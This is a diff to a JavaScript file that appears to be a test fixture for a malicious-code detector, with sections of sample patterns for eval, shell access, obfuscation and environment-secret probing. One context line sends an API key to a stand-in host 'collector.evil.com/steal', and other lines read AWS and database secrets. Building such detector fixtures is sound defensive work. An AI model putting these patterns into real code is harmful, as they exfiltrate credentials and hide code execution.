@@ -6,12 +6,12 @@ import http from 'http';
 import { exec, spawn } from 'child_process';
 import vm from 'vm';
 import * as net from 'net';
+//import {generateKey,getKeys } from './keyGenerator.js'
 
 // ─── CATEGORY 1: Dynamic Code Execution ───────────────────────────────────────
 eval("console.log('hello')");
 const fn = new Function('x', 'return x * 2');
-vm.runInNewContext('process.exit(1)');
-vm.runInThisContext('1 + 1');
+
 setTimeout("console.log('sneaky')", 1000);
 
 // ─── CATEGORY 2: Shell / System Access ────────────────────────────────────────
@@ -42,9 +42,22 @@ http.request({ host: 'collector.evil.com', path: '/steal', body: {"apiKeyTest" :
 // ─── CATEGORY 6: Obfuscation ──────────────────────────────────────────────────
 eval(Buffer.from('Y29uc29sZS5sb2coJ2hpJyk=', 'base64').toString());
 const hidden = '\x65\x76\x61\x6c';
-
+vm.runInNewContext('process.exit(1)');
+vm.runInThisContext('1 + 1');
 // ─── CATEGORY 7: Process Probing ──────────────────────────────────────────────
 const secret1 = process.env.AWS_SECRET_KEY;
 const secret2 = process.env.DATABASE_URL;
 process.exit(0);
 process.chdir('/tmp');
+let secret3 = secret1;
+const {v1,v2} = generateKey()
+//Huge array strings
+const _0xabc = [
+   "push",
+   "shift",
+   "constructor",
+   "return this"
+]
+const nestedArr = [
+    ["ele1","ele2"],["ele3","ele4"]
+]
